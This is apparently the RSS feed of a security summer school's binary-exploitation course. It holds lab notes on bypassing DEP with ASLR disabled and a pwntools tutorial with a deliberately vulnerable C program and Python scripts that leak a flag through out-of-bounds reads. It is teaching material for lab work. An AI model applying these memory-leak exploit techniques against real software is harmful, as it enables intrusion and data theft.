@@ -1,0 +1,303 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Security Summer School –</title><link>/binary/</link><description>Recent content on Security Summer School</description><generator>Hugo -- gohugo.io</generator><atom:link href="/binary/index.xml" rel="self" type="application/rss+xml"/><item><title>Binary:</title><link>/binary/bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/readme/</guid><description>
+&lt;p>This exploit works with ASLR disabled. To disable ASLR (it&amp;rsquo;s enabled by default on Linux) use:&lt;/p>
+&lt;pre>&lt;code>setarch x86_64 -R /bin/bash
+&lt;/code>&lt;/pre>&lt;p>We find the non-randomized address of the &lt;code>puts&lt;/code> function in the standard C library by using GDB:&lt;/p>
+&lt;pre>&lt;code>$ gdb ./vuln
+Reading symbols from ./vuln...done.
+(gdb) start
+Temporary breakpoint 1 at 0x40059e: file vuln.c, line 13.
+Starting program: /home/razvan/projects/ctf/sss/sss-exploit-internal.git/sessions/12-bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/vuln
+Temporary breakpoint 1, main () at vuln.c:13
+13 puts(&amp;quot;Hello&amp;quot;);
+(gdb) p puts
+$1 = {int (const char *)} 0x7ffff7a64a30 &amp;lt;_IO_puts&amp;gt;
+&lt;/code>&lt;/pre></description></item><item><title>Binary:</title><link>/binary/bypassing-mitigations/activities/08-challenge-bypass-dep-no-aslr-libc/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/bypassing-mitigations/activities/08-challenge-bypass-dep-no-aslr-libc/readme/</guid><description>
+&lt;p>Assume ASLR disabled. To disable ASLR (it&amp;rsquo;s enabled by default on Linux) use:&lt;/p>
+&lt;pre>&lt;code>setarch x86_64 -R /bin/bash
+&lt;/code>&lt;/pre></description></item><item><title>Binary:</title><link>/binary/bypassing-mitigations/activities/09-challenge-bypass-dep-aslr-libc/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/bypassing-mitigations/activities/09-challenge-bypass-dep-aslr-libc/readme/</guid><description>
+&lt;p>ASLR is enabled for this challenge.&lt;/p></description></item><item><title>Binary:</title><link>/binary/extra/pwntools-intro/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/extra/pwntools-intro/readme/</guid><description>
+&lt;h1 id="pwntools-tutorial">Pwntools Tutorial&lt;/h1>
+&lt;hr>
+&lt;p>Even though pwntools is an excellent CTF framework, it is also an exploit development library. It was developed by Gallopsled, a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations. Pwntools comes to level the playing field and bring together developers to create a common framework of tools.&lt;/p>
+&lt;h2 id="installation">Installation&lt;/h2>
+&lt;hr>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ pip install -U pwntools
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="local-and-remote-io">Local and remote I/O&lt;/h2>
+&lt;hr>
+&lt;p>Pwntools enables you to dynamically interact (through scripting) with either local or remote processes, as follows:&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#000">IP&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;10.11.12.13&amp;#39;&lt;/span>
+&lt;span style="color:#000">PORT&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1337&lt;/span>
+&lt;span style="color:#000">local&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87;font-weight:bold">False&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#204a87;font-weight:bold">not&lt;/span> &lt;span style="color:#000">local&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
+&lt;span style="color:#000">io&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">remote&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">IP&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">PORT&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">else&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
+&lt;span style="color:#000">io&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">process&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;/path/to/binary&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">interactive&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can send and receive data from a local or remote process via &lt;code>send&lt;/code>, &lt;code>sendline&lt;/code>, &lt;code>recv&lt;/code>, &lt;code>recvline&lt;/code>, &lt;code>recvlines&lt;/code> and &lt;code>recvuntil&lt;/code>.&lt;/p>
+&lt;p>Let&amp;rsquo;s construct a complete example in which we interact with a local process.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">argc&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#000">argv&lt;/span>&lt;span style="color:#000;font-weight:bold">[])&lt;/span>
+&lt;span style="color:#000;font-weight:bold">{&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">flag&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">10&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;S&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;E&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;C&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;R&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;E&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;T&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;F&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;L&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;G&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">};&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">digits&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">10&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;0&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;3&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;4&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;5&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;6&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;7&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;8&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;9&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">};&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">index&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">while&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
+&lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Give me an index and I&amp;#39;ll tell you what&amp;#39;s there!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
+&lt;span style="color:#000">scanf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;%d&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&lt;/span>&lt;span style="color:#000">index&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
+&lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Okay, here you go: %p %c&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&lt;/span>&lt;span style="color:#000">digits&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">index&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">digits&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">index&lt;/span>&lt;span style="color:#000;font-weight:bold">]);&lt;/span>
+&lt;span style="color:#000;font-weight:bold">}&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;span style="color:#000;font-weight:bold">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s leak one byte of the flag using pwntools.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#8f5902;font-style:italic">#!/usr/bin/env python&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
+&lt;span style="color:#000">io&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">process&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;leaky&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># &amp;#34;Give me an index and I&amp;#39;ll tell you what&amp;#39;s there!\n&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Send offset -10&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sendline&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;-10&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Here you go\n&lt;/span>
+&lt;span style="color:#000">result&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Got: &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">result&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">interactive&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we run the previous script, we get the following output:&lt;/p>
+&lt;pre>&lt;code>[+] Starting local process './leaky': Done
+Got: Okay, here you go: 0xffe947d8 S
+[*] Switching to interactive mode
+[*] Process './leaky' stopped with exit code 0
+[*] Got EOF while reading in interactive
+$
+&lt;/code>&lt;/pre>&lt;p>Notice the $ prompt which still awaits input from us to feed the process. This is due to the &lt;code>io.interactive()&lt;/code> line at the end of the script.&lt;/p>
+&lt;p>We can encapsulate the previous sequence of interactions inside a function which we can loop.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#8f5902;font-style:italic">#!/usr/bin/env python&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">leak_char&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">offset&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># &amp;#34;Give me an index and I&amp;#39;ll tell you what&amp;#39;s there!\n&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Send offset&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sendline&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87">str&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">offset&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Here you go\n&lt;/span>
+&lt;span style="color:#000">result&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Parse the result&lt;/span>
+&lt;span style="color:#000">leaked_char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">result&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">split&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;go: &amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">split&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">split&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#000">leaked_char&lt;/span>
+&lt;span style="color:#000">io&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">process&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;leaky&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#000">flag&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;&amp;#39;&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">for&lt;/span> &lt;span style="color:#000">i&lt;/span> &lt;span style="color:#204a87;font-weight:bold">in&lt;/span> &lt;span style="color:#204a87">range&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">10&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
+&lt;span style="color:#000">flag&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">leak_char&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">decode&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;The flag is: &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">flag&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">close&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we run this script, we leak the flag.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./demo_pwn.py
+&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>+&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> Starting &lt;span style="color:#204a87">local&lt;/span> process &lt;span style="color:#4e9a06">&amp;#39;./leaky&amp;#39;&lt;/span>: Done
+The flag is: SECRETFLAG
+&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>*&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> Stopped program &lt;span style="color:#4e9a06">&amp;#39;./leaky&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="logging">Logging&lt;/h2>
+&lt;hr>
+&lt;p>The previous example was a bit… quiet. Fortunately, pwntools has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes. Let&amp;rsquo;s log each of our steps within the &lt;code>leak_char&lt;/code> function.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">leak_char&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">offset&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># &amp;#34;Give me an index and I&amp;#39;ll tell you what&amp;#39;s there!\n&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Send offset&lt;/span>
+&lt;span style="color:#000">log&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">info&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Sending request for offset: &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#204a87">str&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">offset&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sendline&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87">str&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">offset&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Here you go\n&lt;/span>
+&lt;span style="color:#000">result&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">io&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recvline&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;span style="color:#000">log&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">info&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Got back raw response: &lt;/span>&lt;span style="color:#4e9a06">{}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">result&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Parse the result&lt;/span>
+&lt;span style="color:#000">leaked_char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">result&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">split&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;go: &amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">split&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">split&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
+&lt;span style="color:#000">log&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">info&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Parsed char: &lt;/span>&lt;span style="color:#4e9a06">{}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">leaked_char&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#000">leaked_char&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now the output should be much more verbose:&lt;/p>
+&lt;pre>&lt;code>[+] Starting local process './leaky': Done
+[*] Sending request for offset: -10
+[*] Got back raw response: Okay, here you go: 0xffb14948 S
+[*] Parsed char: S
+[*] Sending request for offset: -9
+[*] Got back raw response: Okay, here you go: 0xffb14949 E
+[*] Parsed char: E
+[*] Sending request for offset: -8
+[*] Got back raw response: Okay, here you go: 0xffb1494a C
+[*] Parsed char: C
+[*] Sending request for offset: -7
+[*] Got back raw response: Okay, here you go: 0xffb1494b R
+[*] Parsed char: R
+[*] Sending request for offset: -6
+[*] Got back raw response: Okay, here you go: 0xffb1494c E
+[*] Parsed char: E
+[*] Sending request for offset: -5
+[*] Got back raw response: Okay, here you go: 0xffb1494d T
+[*] Parsed char: T
+[*] Sending request for offset: -4
+[*] Got back raw response: Okay, here you go: 0xffb1494e F
+[*] Parsed char: F
+[*] Sending request for offset: -3
+[*] Got back raw response: Okay, here you go: 0xffb1494f L
+[*] Parsed char: L
+[*] Sending request for offset: -2
+[*] Got back raw response: Okay, here you go: 0xffb14950 A
+[*] Parsed char: A
+[*] Sending request for offset: -1
+[*] Got back raw response: Okay, here you go: 0xffb14951 G
+[*] Parsed char: G
+[*] The flag is: SECRETFLAG
+[*] Stopped program './leaky'
+&lt;/code>&lt;/pre>&lt;h2 id="assembly-and-elf-manipulation">Assembly and ELF manipulation&lt;/h2>
+&lt;hr>
+&lt;p>Pwntools can also be used for precision work, like working with ELF files and their symbols.&lt;/p>
